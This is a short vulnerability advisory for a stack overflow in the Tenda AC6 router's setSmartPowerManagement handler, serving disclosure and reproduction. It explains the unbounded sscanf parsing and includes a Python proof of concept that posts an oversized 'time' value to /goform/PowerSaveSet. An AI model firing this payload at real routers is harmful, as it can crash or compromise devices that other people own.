Tenda AC6 V15.03.05.16 was discovered to contain a stack overflow via the time parameter in the setSmartPowerManagement function.
 
Vulnerability Description
Vendor: Tenda
Product: AC6
Version: V15.03.05.16
Type: Buffer Overflow
Firmware link: https://www.tenda.com.cn/material/show/102661
 
Vulnerability Details
The function "setSmartPowerManagement" retrieves the parameter "time" using "sub_2B7C4", the value of "time" is formatted using the sscanf function with the format "%[^:]:%[^-]-%[^:]:%s". 
This greedy matching mechanism is insecure, as it can cause a stack overflow if the size of the data we enter exceeds the sizes of "v10", "v9", "v8", or "v7".
 ![image](https://github.com/user-attachments/assets/153bb4ab-4d72-4f3d-8366-cc270673bced)

Recurring vulnerabilities and POC
import requests
ip = '192.168.2.3'
url = f'http://{ip}/goform/PowerSaveSet'
payload = {
    "time": '1:00-1:'+'1'*0x500
}
res = requests.post(url=url, data=payload)
print(res.content)
![image](https://github.com/user-attachments/assets/db2201bd-4946-4524-b951-1ce9cc19617c)
